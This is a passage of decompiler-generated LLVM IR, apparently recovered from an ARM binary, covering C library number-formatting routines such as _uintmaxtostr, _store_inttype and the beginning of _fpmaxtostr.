  br label %dec_label_pc_13c54

dec_label_pc_13c54:                               ; preds = %dec_label_pc_13bf8, %dec_label_pc_13c38
  %v2_13c60 = phi i32 [ %v0_13c08, %dec_label_pc_13bf8 ], [ %v0_13c54.pre, %dec_label_pc_13c38 ]
  %v1_13c54 = inttoptr i32 %v2_13c60 to i16*
  %v2_13c54 = load i16, i16* %v1_13c54, align 2
  %v3_13c54 = zext i16 %v2_13c54 to i32
  %v1_13c58 = or i16 %v2_13c54, 64
  %v1_13c5c = and i32 %v3_13c54, 2816
  store i32 %v1_13c5c, i32* %r0.global-to-local, align 4
  %v2_13c5c = icmp eq i32 %v1_13c5c, 0
  store i16 %v1_13c58, i16* %v1_13c54, align 2
  br i1 %v2_13c5c, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_13c54
  %v1_13c64 = load i32, i32* @r4, align 4
  %v2_13c64 = add i32 %v1_13c64, 12
  %v3_13c64 = inttoptr i32 %v2_13c64 to i32*
  %v4_13c64 = load i32, i32* %v3_13c64, align 4
  %v3_13c68 = add i32 %v1_13c64, 28
  %v4_13c68 = inttoptr i32 %v3_13c68 to i32*
  store i32 %v4_13c64, i32* %v4_13c68, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_13c54
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_13be4, %.thread1
  %v2_13c70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13c70, i32* @r4, align 4
  %v1_13c74 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13c74

; uselistorder directives
  uselistorder i32 %v2_13c44, { 1, 0 }
  uselistorder i32 %v0_13c08, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_13bac, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c54, { 1, 0 }
  uselistorder label %dec_label_pc_13c38, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13c20, { 1, 0 }
  uselistorder label %dec_label_pc_13bd8, { 1, 0 }
  uselistorder label %dec_label_pc_13bcc, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_13c78 = load i32, i32* @r2, align 4
  %v1_13c78 = icmp slt i32 %v0_13c78, 0
  %v0_13c7c = load i32, i32* @r0, align 4
  %v1_13c80 = and i32 %v0_13c7c, 2048
  %v2_13cb4 = icmp eq i32 %v1_13c80, 0
  br i1 %v1_13c78, label %dec_label_pc_13cb4, label %dec_label_pc_13c88

dec_label_pc_13c88:                               ; preds = %entry
  br i1 %v2_13cb4, label %dec_label_pc_13c90, label %dec_label_pc_13cbc

dec_label_pc_13c90:                               ; preds = %dec_label_pc_13c88
  %v7_13c90 = icmp eq i32 %v0_13c7c, 256
  %v0_13c94 = load i32, i32* @r1, align 4
  %v1_13c94 = inttoptr i32 %v0_13c94 to i32*
  %v2_13c94 = load i32, i32* %v1_13c94, align 4
  %v2_13c98 = urem i32 %v2_13c94, 256
  %v2_13c98.v2_13c94 = select i1 %v7_13c90, i32 %v2_13c98, i32 %v2_13c94
  br i1 %v7_13c90, label %.thread, label %dec_label_pc_13ca0

dec_label_pc_13ca0:                               ; preds = %dec_label_pc_13c90
  %v7_13ca0 = icmp eq i32 %v0_13c7c, 512
  br i1 %v7_13ca0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13ca0
  %v4_13ca8 = urem i32 %v2_13c98.v2_13c94, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13ca0, %dec_label_pc_13c90, %bb
  %v1_13cb0 = phi i32 [ %v2_13c94, %dec_label_pc_13ca0 ], [ %v2_13c98, %dec_label_pc_13c90 ], [ %v4_13ca8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_13cb0

dec_label_pc_13cb4:                               ; preds = %entry
  br i1 %v2_13cb4, label %dec_label_pc_13cc4, label %dec_label_pc_13cbc

dec_label_pc_13cbc:                               ; preds = %dec_label_pc_13c88, %dec_label_pc_13cb4
  %v0_13cbc = load i32, i32* @r1, align 4
  %v1_13cbc = inttoptr i32 %v0_13cbc to i32*
  %v2_13cbc = load i32, i32* %v1_13cbc, align 4
  %v3_13cbc = add i32 %v0_13cbc, 4
  %v4_13cbc = inttoptr i32 %v3_13cbc to i32*
  %v5_13cbc = load i32, i32* %v4_13cbc, align 4
  store i32 %v5_13cbc, i32* @r1, align 4
  ret i32 %v2_13cbc

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cb4
  %v7_13cc4 = icmp eq i32 %v0_13c7c, 256
  %v0_13cc8 = load i32, i32* @r1, align 4
  %v1_13cc8 = inttoptr i32 %v0_13cc8 to i32*
  %v2_13cc8 = load i32, i32* %v1_13cc8, align 4
  %v2_13ccc = urem i32 %v2_13cc8, 256
  %v2_13ccc.v2_13cc8 = select i1 %v7_13cc4, i32 %v2_13ccc, i32 %v2_13cc8
  br i1 %v7_13cc4, label %.thread2, label %dec_label_pc_13cd4

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13cc4
  %v7_13cd4 = icmp eq i32 %v0_13c7c, 512
  br i1 %v7_13cd4, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_13cd4
  %v4_13cd8 = mul i32 %v2_13ccc.v2_13cc8, 65536
  %v4_13cdc = sdiv i32 %v4_13cd8, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13cd4, %dec_label_pc_13cc4, %bb5
  %v0_13ce0 = phi i32 [ %v2_13cc8, %dec_label_pc_13cd4 ], [ %v2_13ccc, %dec_label_pc_13cc4 ], [ %v4_13cdc, %bb5 ]
  %v3_13ce0 = ashr i32 %v0_13ce0, 31
  store i32 %v3_13ce0, i32* @r1, align 4
  ret i32 %v0_13ce0

; uselistorder directives
  uselistorder i32 %v0_13ce0, { 1, 0 }
  uselistorder i32 %v2_13ccc, { 1, 0 }
  uselistorder i32 %v2_13cc8, { 1, 2, 0 }
  uselistorder i32 %v2_13c98, { 1, 0 }
  uselistorder i32 %v2_13c94, { 1, 2, 0 }
  uselistorder i1 %v2_13cb4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13cbc, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_13ce8 = icmp eq i32 %arg2, 256
  store i1 %v7_13ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13ce8, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_13cec = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_13cec, i8* %tmp3, align 1
  %v1_13cf0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_13cf0 = phi i1 [ false, %entry ], [ %v1_13cf0.pre, %bb ]
  %v0_13cf0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_13cf0, i32 %v0_13cf0)
  %v7_13cf4 = icmp eq i32 %arg2, 2048
  store i1 %v7_13cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cf4, label %dec_label_pc_13cfc, label %dec_label_pc_13d04

dec_label_pc_13cfc:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_13cfc = add i32 %tmp2, 4
  %v6_13cfc = inttoptr i32 %v5_13cfc to i32*
  store i32 %arg4, i32* %v6_13cfc, align 4
  ret i32 %tmp2

dec_label_pc_13d04:                               ; preds = %bb4
  %v7_13d04 = icmp eq i32 %arg2, 512
  store i1 %v7_13d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d04, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_13d04
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_13d04
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 512, { 5, 6, 7, 8, 1, 4, 10, 3, 11, 2, 9, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_13d20 = icmp slt i32 %tmp21, 0
  %v2_13d20 = icmp eq i32 %tmp21, 0
  store i1 %v2_13d20, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_13d28 = load i32, i32* @r2, align 4
  store i32 %v0_13d28, i32* %r5.global-to-local, align 4
  %v0_13d2c = load i32, i32* @r3, align 4
  store i32 %v0_13d2c, i32* %r6.global-to-local, align 4
  br i1 %v1_13d20, label %dec_label_pc_13d34, label %dec_label_pc_13d54

dec_label_pc_13d34:                               ; preds = %entry
  %v1_13d34 = icmp slt i32 %v0_13d2c, 0
  %v2_13d34 = icmp eq i32 %v0_13d2c, 0
  store i1 %v2_13d34, i1* %cpsr_z.global-to-local, align 1
  %v1_13d38 = sub i32 0, %tmp21
  store i32 %v1_13d38, i32* %r7.global-to-local, align 4
  br i1 %v1_13d34, label %dec_label_pc_13d40, label %dec_label_pc_13d54

dec_label_pc_13d40:                               ; preds = %dec_label_pc_13d34
  %v1_13d44 = sub i32 0, %v0_13d28
  store i32 %v1_13d44, i32* %r5.global-to-local, align 4
  %v2_13d44 = icmp eq i32 %v0_13d28, 0
  %v2_13d48 = icmp eq i1 %v2_13d44, false
  %v5_13d48 = sext i1 %v2_13d48 to i32
  %v6_13d48 = sub i32 %v5_13d48, %v0_13d2c
  store i32 %v6_13d48, i32* %r6.global-to-local, align 4
  %v19_13d48 = icmp eq i32 %v6_13d48, 0
  store i1 %v19_13d48, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d5c

dec_label_pc_13d54:                               ; preds = %dec_label_pc_13d34, %entry
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d40, %dec_label_pc_13d54
  %storemerge = phi i8 [ 0, %dec_label_pc_13d54 ], [ 1, %dec_label_pc_13d40 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_13d64 = load i32, i32* %r7.global-to-local, align 4
  %v2_13d6c = udiv i32 -1, %v0_13d64
  store i32 %v2_13d6c, i32* %fp.global-to-local, align 4
  %v3_13d7c = urem i32 -1, %v0_13d64
  %v1_13d80 = add i32 %v3_13d7c, 1
  store i32 %v1_13d80, i32* %sb.global-to-local, align 4
  %v9_13d84 = icmp eq i32 %v1_13d80, %v0_13d64
  store i1 %v9_13d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13d84, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d5c
  %v1_13d88 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_13d88, i32* %sb.global-to-local, align 4
  %v2_13d8c = add i32 %v2_13d6c, 1
  store i32 %v2_13d8c, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13d5c, %bb
  %v0_13d90 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13d90, i32* %sl.global-to-local, align 4
  %v0_13d94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13d94, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13d98

dec_label_pc_13d98thread-pre-split:               ; preds = %bb25
  %v0_13d98.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_13d9c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_13da0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d98

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d98thread-pre-split, %.thread
  %v0_13e1c = phi i32 [ %v0_13da0.pre, %dec_label_pc_13d98thread-pre-split ], [ %v0_13d64, %.thread ]
  %v0_13e14 = phi i32 [ %v0_13d9c.pre, %dec_label_pc_13d98thread-pre-split ], [ %v0_13d94, %.thread ]
  %v0_13db0 = phi i32 [ %v0_13d98.pr, %dec_label_pc_13d98thread-pre-split ], [ %v0_13d90, %.thread ]
  %v2_13d98 = icmp eq i32 %v0_13db0, 0
  store i1 %v2_13d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d98, label %dec_label_pc_13e10, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13d98
  %v2_13dac = udiv i32 %v0_13db0, %v0_13e1c
  %v3_13dac = urem i32 %v0_13db0, %v0_13e1c
  store i32 %v2_13dac, i32* %sl.global-to-local, align 4
  %v2_13dcc = udiv i32 %v0_13e14, %v0_13e1c
  %v3_13dcc = urem i32 %v0_13e14, %v0_13e1c
  %v0_13dd0 = load i32, i32* %sb.global-to-local, align 4
  %v2_13dd0 = mul i32 %v0_13dd0, %v3_13dac
  %v2_13dd8 = add i32 %v2_13dd0, %v3_13dcc
  store i32 %v2_13dd8, i32* %r5.global-to-local, align 4
  %v0_13de4 = load i32, i32* %fp.global-to-local, align 4
  %v2_13de4 = mul i32 %v0_13de4, %v3_13dac
  %v2_13dec = add i32 %v2_13de4, %v2_13dcc
  %v2_13df4 = udiv i32 %v2_13dd8, %v0_13e1c
  %v2_13dfc = add i32 %v2_13dec, %v2_13df4
  br label %dec_label_pc_13e28

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13d98
  %v2_13e10 = udiv i32 %v0_13e14, %v0_13e1c
  br label %dec_label_pc_13e28

dec_label_pc_13e28:                               ; preds = %dec_label_pc_13da8, %dec_label_pc_13e10
  %storemerge28 = phi i32 [ %v2_13e10, %dec_label_pc_13e10 ], [ %v2_13dfc, %dec_label_pc_13da8 ]
  %v0_13e44 = phi i32 [ %v2_13e10, %dec_label_pc_13e10 ], [ %v2_13dfc, %dec_label_pc_13da8 ]
  %v1_13e44 = phi i32 [ 0, %dec_label_pc_13e10 ], [ %v2_13dac, %dec_label_pc_13da8 ]
  %v2_13dd8.pn = phi i32 [ %v0_13e14, %dec_label_pc_13e10 ], [ %v2_13dd8, %dec_label_pc_13da8 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_13e30 = urem i32 %v2_13dd8.pn, %v0_13e1c
  %v2_13e2c = icmp ugt i32 %v0_13e30, 8
  %v7_13e2c = icmp eq i32 %v0_13e30, 9
  store i1 %v7_13e2c, i1* %cpsr_z.global-to-local, align 1
  %v1_13e34 = add i32 %v0_13e30, 48
  %v0_13e3c = load i32, i32* %r8.global-to-local, align 4
  %v1_13e3c = add i32 %v0_13e3c, -1
  store i32 %v1_13e3c, i32* %r8.global-to-local, align 4
  %v2_13e40 = xor i1 %v7_13e2c, true
  %v3_13e40 = and i1 %v2_13e2c, %v2_13e40
  %extract.t = trunc i32 %v1_13e34 to i8
  br i1 %v3_13e40, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_13e28
  %v2_13e30 = add i32 %v0_13e30, %tmp11
  %extract.t9 = trunc i32 %v2_13e30 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_13e28, %bb24
  %v0_13e48.off0 = phi i8 [ %extract.t, %dec_label_pc_13e28 ], [ %extract.t9, %bb24 ]
  %v2_13e44 = or i32 %v0_13e44, %v1_13e44
  %v4_13e44 = icmp eq i32 %v2_13e44, 0
  store i1 %v4_13e44, i1* %cpsr_z.global-to-local, align 1
  %v3_13e48 = inttoptr i32 %v1_13e3c to i8*
  store i8 %v0_13e48.off0, i8* %v3_13e48, align 1
  %v0_13e4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e4c, label %dec_label_pc_13e50, label %dec_label_pc_13d98thread-pre-split

dec_label_pc_13e50:                               ; preds = %bb25
  %v4_13e5010 = zext i8 %storemerge to i32
  store i32 %v4_13e5010, i32* @r3, align 4
  %v2_13e54 = icmp eq i8 %storemerge, 0
  store i1 %v2_13e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e54, label %dec_label_pc_13e50..thread2_crit_edge, label %bb26

dec_label_pc_13e50..thread2_crit_edge:            ; preds = %dec_label_pc_13e50
  %v0_13e60.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_13e50
  store i32 45, i32* @r3, align 4
  %v3_13e5c = load i32, i32* %r8.global-to-local, align 4
  %v4_13e5c = add i32 %v3_13e5c, -1
  %v5_13e5c = inttoptr i32 %v4_13e5c to i8*
  store i8 45, i8* %v5_13e5c, align 1
  %v6_13e5c = load i32, i32* %r8.global-to-local, align 4
  %v7_13e5c = add i32 %v6_13e5c, -1
  store i32 %v7_13e5c, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13e50..thread2_crit_edge, %bb26
  %v0_13e60 = phi i32 [ %v0_13e60.pre, %dec_label_pc_13e50..thread2_crit_edge ], [ %v7_13e5c, %bb26 ]
  ret i32 %v0_13e60

; uselistorder directives
  uselistorder i32 %v0_13e30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13e1c, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_13d28, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 1, 2, 0, 3 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_13e28, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_13d5c, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_13e70 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_13e7c = add i32 %arg4, 8
  %v2_13e7c = inttoptr i32 %v1_13e7c to i8*
  %v3_13e7c = load i8, i8* %v2_13e7c, align 1
  %v4_13e7c = zext i8 %v3_13e7c to i32
  store i32 %v4_13e7c, i32* %sb.global-to-local, align 4
  %v1_13e80 = or i32 %v4_13e7c, 32
  %v7_13e84 = icmp eq i32 %v1_13e80, 97
  store i1 %v7_13e84, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_13e9c = inttoptr i32 %arg4 to i32*
  %v2_13e9c = load i32, i32* %v1_13e9c, align 4
  store i32 %v2_13e9c, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_13ea4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13ea4, i32* %r6.global-to-local, align 4
  store i32 45376, i32* %ip.global-to-local, align 4
  br i1 %v7_13e84, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_13eac = add nuw nsw i32 %v4_13e7c, 6
  store i32 %v2_13eac, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_13ebc = phi i32 [ %v0_13ea4, %entry ], [ %v2_13eac, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_13eb4 = add i32 %arg4, 12
  %v2_13eb4 = inttoptr i32 %v1_13eb4 to i32*
  %v3_13eb4 = load i32, i32* %v2_13eb4, align 4
  store i32 %v3_13eb4, i32* %r2.global-to-local, align 4
  %v1_13eb8 = add i32 %arg4, 4
  %v2_13eb8 = inttoptr i32 %v1_13eb8 to i32*
  %v3_13eb8 = load i32, i32* %v2_13eb8, align 4
  store i32 %v3_13eb8, i32* @lr, align 4
  br i1 %v7_13e84, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_13ebc = urem i32 %v1_13ebc, 256
  store i32 %v2_13ebc, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_13ec0 = icmp slt i32 %v2_13e9c, 0
  %v2_13ec0 = icmp eq i32 %v2_13e9c, 0
  store i1 %v2_13ec0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_13ec0, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_13ed0 = and i32 %v3_13eb4, 2
  %v2_13ed0 = icmp eq i32 %v1_13ed0, 0
  store i1 %v2_13ed0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_13ed0, label %dec_label_pc_13ee8, label %dec_label_pc_13ef4

dec_label_pc_13ee8:                               ; preds = %bb205
  %v1_13ee8 = urem i32 %v3_13eb4, 2
  %v2_13ee8 = icmp eq i32 %v1_13ee8, 0
  store i1 %v2_13ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ee8, label %dec_label_pc_13ef8, label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ee8, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_13ee8 ]
  %v0_13ef4.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_13ee8 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_13ef4.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ee8, %dec_label_pc_13ef4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_13ea4, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_13ea4, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_13f14 = fptrunc double %arg2 to float
  %v2_13f14 = bitcast float %v1_13f14 to i32
  %v9_13f14 = call i32 @__aeabi_dcmpeq(i32 %v2_13f14, i32 %v0_13ea4, i32 %v2_13f14, i32 %v0_13ea4, i32 0)
  store i32 %v9_13f14, i32* %r0.global-to-local, align 4
  %v2_13f18 = icmp eq i32 %v9_13f14, 0
  store i1 %v2_13f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f18, label %bb207, label %dec_label_pc_13f28

bb207:                                            ; preds = %dec_label_pc_13ef8
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13f28:                               ; preds = %dec_label_pc_13ef8
  %v0_13f28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f28, i32* @r0, align 4
  %v0_13f2c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13f2c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_13f38 = call i32 @__aeabi_dcmpeq(i32 %v0_13f28, i32 %v0_13f2c, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_13f38, i32* %r0.global-to-local, align 4
  %v2_13f3c = icmp eq i32 %v7_13f38, 0
  store i1 %v2_13f3c, i1* %cpsr_z.global-to-local, align 1
  %v0_13f84 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f84 = sext i32 %v0_13f84 to i64
  %v2_13f84 = bitcast i64 %v1_13f84 to double
  br i1 %v2_13f3c, label %dec_label_pc_13f84, label %dec_label_pc_13f44

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f28
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_13f54 = fdiv double 0.000000e+00, %v2_13f84
  %v10_13f54 = fptrunc double %v9_13f54 to float
  %v11_13f54 = bitcast float %v10_13f54 to i32
  store i32 %v11_13f54, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_13f60 = call i32 @__aeabi_dcmplt(i32 %v11_13f54, i32 1072693248, i32 0, i32 0)
  store i32 %v4_13f60, i32* %r0.global-to-local, align 4
  %v2_13f64 = icmp eq i32 %v4_13f60, 0
  store i1 %v2_13f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f64, label %bb208, label %dec_label_pc_13f70

bb208:                                            ; preds = %dec_label_pc_13f44
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14150

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f44
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_14150

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f28
  store i32 %v0_13f84, i32* @r0, align 4
  %v0_13f88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13f88, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13f94 = fptrunc double %v2_13f84 to float
  %v2_13f94 = bitcast float %v1_13f94 to i32
  %v6_13f94 = call i32 @__aeabi_dcmplt(i32 %v2_13f94, i32 %v0_13f88, i32 0, i32 0)
  store i32 %v6_13f94, i32* %r0.global-to-local, align 4
  %v2_13f98 = icmp eq i32 %v6_13f94, 0
  store i1 %v2_13f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f98, label %dec_label_pc_13f84..thread9_crit_edge, label %bb209

dec_label_pc_13f84..thread9_crit_edge:            ; preds = %dec_label_pc_13f84
  %v0_13fb8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_13f84
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_13fa0 = load i32, i32* %r6.global-to-local, align 4
  %v2_13fa0 = sub i32 0, %v1_13fa0
  store i32 %v2_13fa0, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_13fa0, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13f84..thread9_crit_edge, %bb209
  %v0_13fb8 = phi i32 [ %v0_13fb8.pre, %dec_label_pc_13f84..thread9_crit_edge ], [ %v2_13fa0, %bb209 ]
  %v0_13fb4 = load i32, i32* %r5.global-to-local, align 4
  %v1_13fb4 = sext i32 %v0_13fb4 to i64
  %v2_13fb4 = bitcast i64 %v1_13fb4 to double
  %v9_13fbc = fmul double %v2_13fb4, 0.000000e+00
  %v10_13fbc = fptrunc double %v9_13fbc to float
  %v11_13fbc = bitcast float %v10_13fbc to i32
  store i32 %v11_13fbc, i32* @r2, align 4
